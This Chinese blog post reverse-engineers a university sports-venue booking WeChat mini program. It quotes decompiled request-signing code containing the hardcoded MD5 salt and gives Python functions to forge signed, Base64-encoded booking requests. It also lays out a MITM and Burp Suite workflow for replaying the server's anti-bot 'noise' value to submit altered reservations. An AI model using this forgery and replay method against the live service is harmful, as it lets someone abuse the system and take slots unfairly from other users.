# 中科大运动小程序预约分析P1

>  杨旭写于2024.08.13

说明：目标是版本103的小程序，我分析过两版小程序，其中参数sign有些改变

Windows平台工具：wxapkg(https://github.com/wux1an/wxapkg)

## 1. 解析小程序拿到源码

使用wxapkg解析103版本的微信小程序，该工具只能在windows系统下运行。尽管也有mac下的解包软件，但是实测没有这个好用。

## 2. 分析代码

### 2.1 默认请求函数

小程序发送请求的默认函数，可以分析的是每次发送get请求和post请求时，都会在原有参数的基础上，添加open_id，version，timestamp（毫秒时间戳）和sign参数，sign参数是把参数排序添加一段字符串计算md5值。

```javascript
var n = function(e) {
  var n, r, l = getApp(),
    u = a(a({}, e.data), {}, {
      open_id: l.globalData.open_id,
      version: l.globalData.accountInfo.miniProgram.version || "1.0.0",
      timestamp: (new Date).getTime()
    });
  u.sign = (n = u, r = [], Object.keys(n).sort().map((function(e) {
    if (void 0 !== n[e] && null !== n[e]) {
      var a = n[e];
      "" !== (a = "object" === t(a) ? JSON.stringify(a) : a.toString().trim()) && r.push("".concat(e, "=").concat(a))
    }
  })), (0, s.default)(r.join("&") + "BwPimfkcRKAmHcbL9tnq")), "POST" === e.method && (u = i.Base64.encode(JSON.stringify({
    all_params: u
  }))), wx.request(a(a({}, e), {}, {
    data: u,
    url: o.base_url + e.url,
    header: a(a({}, e.header || {}), {}, {
      Platform: "MiniProgram",
      DeviceFingerprint: l.globalData.deviceFingerprint || "",
      "Wx-Env": l.globalData.environment || "",
      Authorization: "Bearer " + l.globalData.token
    }),
    success: function(a) {
      if (200 !== a.statusCode || 0 !== a.data.code) return 401 === a.statusCode ? (l.removeLogin(), void wx.navigateTo({
        url: "/pages/login/silent"
      })) : void(200 === a.statusCode ? e.fail ? e.fail(a.data) : wx.showModal({
        title: "提示",
        content: a.data.message || "系统错误",
        showCancel: !1,
        confirmText: "我知道了"
      }) : wx.showModal({
        title: "提示",
        content: a.data.message || "服务器错误:" + a.statusCode,
        showCancel: !1,
        confirmText: "我知道了",
        success: function(e) {
          401 === a.statusCode && wx.switchTab({
            url: "/pages/index/index"
          })
        }
      }));
      e.success && e.success(a.data.data)
    },
    fail: function(a) {
      console.log("wx.request.fail", a, e.fail), e.fail && e.fail(a.data)
    }
  }))
};
```

### 2.2 引入了wx云函数noise参数

让人恶心的事请求了一个微信的云函数，导致这里无法获取无法直接获取noise参数。调用mx_request_noise中，将调用n函数，也就是2.1中的函数请求真实url

```javascript
exports.mx_request_noise = function(e) {
        wx.cloud.init(), wx.cloud.callFunction({
            name: "noise",
            data: e.data
        }).then((function(t) {
            e.data = a(a({}, e.data), {}, {
                noise: t.result
            }), n(e)
        }))
    };
```

### 2.3 分析提交预约的请求分析

可以分析到的数据有data数据，data数据中有day，kind_id，share_open等，那么将这些数据发送给云函数，云函数将会返回一个noise参数。

```javascript
onFinish: function() {
            var t = arguments.length > 0 && void 0 !== arguments[0] && arguments[0],
                e = {
                    day: this.data.day_tab,
                    kind_id: this.data.venue_info.id,
                    share_open: this.data.share_open
                };
            if (e.selected_block = this.data.selected_block, !this.data.is_look_on && this.data.venue_info.need_partner && !t) {
                var a = this.data.partner_list.filter((function(t) {
                    return t.selected
                }));
                if (0 === a.length) return void(0, i.default)("最少需要邀请一名同伴");
                e.selected_partner = a
            }
            wx.showLoading({
                title: "正在提交...",
                mask: !0
            }), (0, o.mx_request_noise)({
                url: "/venue/order",
                method: "POST",
                data: e,
                success: function(t) {
                    wx.redirectTo({
                        url: "/pages/venue/success?order_no=".concat(t.result)
                    })
                },
                complete: function() {
                    wx.hideLoading()
                }
            })
        }
```

## 3. noise参数重放分析

经过分析noise函数可以重放，请求的noise参数发送给服务器，服务器并没有对提交预约的时间做验证，因而存在noise参数重放。相关测试代码将在下面给出。

### 3.1 sign参数的计算

发送get请求和post请求都会有一个sign值计算，由于python和javascript代码的差异有些地方需要调整，才能计算正确的sign值

```Python
def calculate_sign(data_dict):
    sorted_params = sorted(data_dict.items())
    param_list = []
    for key, value in sorted_params:
        if value is not None:
            if isinstance(value, dict):
                value = json.dumps(value, separators=(',', ':'))
            value = str(value).strip().replace(" ", "").replace("'", "\"").replace("True", "true").replace("False","false")
            if value:
                param_list.append(f"{key}={value}")

    concatenated_string = "&".join(param_list)
    final_string = concatenated_string + "BwPimfkcRKAmHcbL9tnq"
    md5_hash = hashlib.md5(final_string.encode('utf-8')).hexdigest()

    return md5_hash
```

### 3.2 post发送数据

接受一个数据字典，计算sign值添加key，然后替换掉一些字符处理，返回base64编码

```python
def encrypt_post_data(data_dict):
    sign_value = calculate_sign(data_dict)
    data_dict['sign'] = sign_value
    all_params = {
        "all_params": data_dict
    }
    json_str = json.dumps(all_params)
    json_str = json_str.replace(" ", "").replace("'","\"").replace("True", "true")
    base64_encoded = base64.b64encode(json_str.encode('utf-8')).decode('utf-8')

    return base64_encoded
```

### 3.3 利用已有post内容更新为新的post内容

计算一个新的时间戳，修改预约的时间，然后再计算sign填入，修改一些字符，最后base64编码

```python
def update_old_param(data):
    param = data
    param_json = base64.b64decode(param).decode("utf-8")
    res = json.loads(param_json)

    del(res['all_params']['sign'])
    res['all_params']['timestamp'] = int(time.time()*1000)
    res['all_params']['selected_block'][0]['hour'] = 18
    res['all_params']['selected_block'][1]['hour'] = 18
    res['all_params']['selected_block'][0]['min'] = 0
    res['all_params']['selected_block'][1]['min'] = 15
    res['all_params']['sign'] = calculate_sign(res['all_params'])


    json_str = json.dumps(res)
    json_str = json_str.replace(" ", "").replace("'", "\"").replace("True", "true")
    print(json_str)
    base64_encoded = base64.b64encode(json_str.encode('utf-8')).decode('utf-8')

    print(base64_encoded)
```

### 3.4 操作流程

使用QuantumultX在mac上开启mitm、http抓包，找到`POST /api/venue/order `的包，将旧的post内容中引号内数据使用update_old_param函数修改一些数据，生成新的post内容，使用burpsuit发出。这个流程需要在一分钟内结束，否则就会出现签名错误。

## 4. 结果分析

noise参数在服务器端应该也有一个验证，虽然这个不是很严重的问题。能否用于抢预约，本人没有这个需求，因而没有继续研究。研究这个小程序也是Just for fun。

## 5. 补充：noise 参数的时间校验

继上一次noise参数分析，noise参数会校验请求时的时间信息。
使用小程序调出来F12调试，提前1分钟请求明日的noise参数即可
